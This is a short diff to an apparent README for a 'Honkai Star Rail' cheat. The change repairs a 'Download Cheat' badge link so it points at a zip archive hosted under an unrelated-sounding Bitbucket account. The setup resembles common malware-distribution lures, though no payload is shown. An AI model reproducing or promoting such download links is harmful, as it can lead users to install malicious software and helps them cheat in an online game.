@@ -2,7 +2,7 @@
   
    ## Download Cheat ⬇️
   
-   [<img src="https://img.shields.io/badge/Honkai_Star_Rail_Hack-Click_To_Download-orange?style=for-the-badge">](*https://bitbucket.org/trafficbinghub/softhubich/downloads/Star-Rail-LegendX.zip*)
+   [<img src="https://img.shields.io/badge/Honkai_Star_Rail_Hack-Click_To_Download-orange?style=for-the-badge">](https://bitbucket.org/trafficbinghub/softhubich/downloads/Star-Rail-LegendX.zip)
 
 
    ## Features
